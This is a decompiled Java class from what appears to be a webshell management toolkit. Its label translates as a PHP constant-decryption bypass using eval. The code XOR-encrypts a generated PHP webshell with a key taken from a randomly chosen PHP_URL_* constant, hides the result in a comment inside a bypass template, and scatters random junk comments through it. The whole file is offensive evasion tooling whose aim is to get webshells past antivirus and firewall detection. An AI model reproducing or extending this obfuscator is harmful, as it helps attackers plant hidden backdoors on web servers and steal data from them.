//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package core.shellprocessor.phpInclude;

import core.annotation.GenerateProcessor;
import core.imp.ShellProcessor;
import java.io.InputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.security.SecureRandom;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import shells.cryptions.phpXor.Generate;
import util.Log;
import util.functions;

@GenerateProcessor(
        DisplayName = "PHP 全版本常量解密绕过（eval）",
        superTemplate = {"php"}
)
public class PhpConstEval implements ShellProcessor {
    private static final String CHARS = "QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|";
    private static final String UPPER_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    private static final SecureRandom RANDOM = new SecureRandom();

    public PhpConstEval() {
    }

    public static String generateRandomString(Boolean isUpper) {
        int length = RANDOM.nextInt(7) + 10;
        StringBuilder sb = new StringBuilder();
        int i;
        int index;
        if (isUpper) {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt("ABCDEFGHIJKLMNOPQRSTUVWXYZ".length());
                sb.append("ABCDEFGHIJKLMNOPQRSTUVWXYZ".charAt(index));
            }

            return sb.toString();
        } else {
            for(i = 0; i < length; ++i) {
                index = RANDOM.nextInt("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|".length());
                sb.append("QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|~!@#$%^&*()_+-={}[];':\",.<>?\\|".charAt(index));
            }

            return "/*" + sb.toString() + "*/";
        }
    }

    public static String xorEncrypt(String data, String key) throws Exception {
        MessageDigest digest = MessageDigest.getInstance("SHA-256");
        byte[] keyBytes = digest.digest(key.getBytes(StandardCharsets.UTF_8));
        byte[] dataBytes = data.getBytes(StandardCharsets.UTF_8);
        byte[] encrypted = new byte[dataBytes.length];

        for(int i = 0; i < dataBytes.length; ++i) {
            encrypted[i] = (byte)(dataBytes[i] ^ keyBytes[i % keyBytes.length]);
        }

        return Base64.getEncoder().encodeToString(encrypted);
    }

    public static String BypassReplace(String data, String pass) {
        try {
            InputStream inputStream = Generate.class.getResourceAsStream("template/templatebypass2.bin");
            String code = new String(functions.readInputStream(inputStream));
            inputStream.close();
            data = data.substring(5);
            Map<String, String> PhpConst = new HashMap<String, String>() {
                {
                    this.put("PHP_URL_SCHEME", "0");
                    this.put("PHP_URL_HOST", "1");
                    this.put("PHP_URL_PORT", "2");
                    this.put("PHP_URL_USER", "3");
                    this.put("PHP_URL_PASS", "4");
                    this.put("PHP_URL_PATH", "5");
                    this.put("PHP_URL_QUERY", "6");
                    this.put("PHP_URL_FRAGMENT", "7");
                }
            };
            Random random = new Random();
            int randomIndex = random.nextInt(PhpConst.size());
            String randomKey = (String)PhpConst.keySet().toArray()[randomIndex];
            String value = (String)PhpConst.get(randomKey);
            code = code.replace("PHP_URL_SCHEME", randomKey);
            data = code.replace("/*code*/", "/*" + xorEncrypt(data, value) + "*/");
            String target = "/*zs*/";
            StringBuilder result = new StringBuilder(data);

            for(int startIndex = 0; (startIndex = result.indexOf(target, startIndex)) != -1; ++startIndex) {
                result.replace(startIndex, startIndex + target.length(), generateRandomString(false));
            }

            data = result.toString();
        } catch (Exception var12) {
            Log.error(var12);
        }

        return data;
    }

    public byte[] doProcessor(byte[] shell, String suffix) {
        return new byte[0];
    }

    public byte[] doProcessor(byte[] shell, String suffix, String pass) {
        return BypassReplace(new String(shell), pass).getBytes();
    }
}
